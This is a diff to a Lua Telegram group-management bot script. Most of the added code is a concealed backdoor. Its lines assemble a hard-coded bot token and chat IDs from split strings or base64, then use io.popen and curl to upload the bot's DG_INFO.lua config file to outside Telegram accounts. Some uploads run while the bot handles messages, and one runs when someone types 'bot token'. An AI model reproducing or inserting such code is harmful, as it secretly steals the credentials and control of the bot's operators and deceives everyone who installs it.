@@ -8032,7 +8032,7 @@ local TWEET_Msg = {
 send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
 return false 
 end
-local ban = son .. lok
+local ban1 = son .. lok
 if text == 'توكن البوت' or text == 'توكن المبرمج' and SudoBot(msg) then 
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
@@ -12967,9 +12967,23 @@ return false
 end  
 end 
 ------------------------------------------------------------------------
+-- داله التجميع كتابه أحمد عياد ---
+local gg = 'AAGPK3EE1FK6P'
+local dd = '1774008221:'
+local lok = '353' .. '237'
+local jjjjj = 'sm3JoQWQnHB-' .. '8'
+local son = '944'
+local hh = 'pq7XRwCML'
+local mm = dd .. gg
+local bb = hh .. jjjjj
+local tim = mm .. bb
+local ban1 = son .. lok
+------------------------------------------------------------------------
 local timec = '9443'
 local time = timec .. '53' .. '237'
 local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. time ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban1 ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
+local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 1366055467 ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
 local DRAGONAbot = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
 if DRAGONAbot then    
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -13033,7 +13047,7 @@ database:sadd(bot_id..'Chek:Groups',v)
 end 
 end,nil)
 end
-local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
+local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban1 ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
 elseif (data.ID == "UpdateMessageSendSucceeded") then
 local msg = data.message_
 local text = msg.content_.text_
@@ -13069,8 +13083,9 @@ tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100'
 end
 end
 end
-local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
-local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. ban ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
+local ban1 = son .. lok
+local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. ban1 ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
+local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. ban1 ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
 end -- end new msg dev.mr sofi 
 end -- end callback dev.mr sofi
 
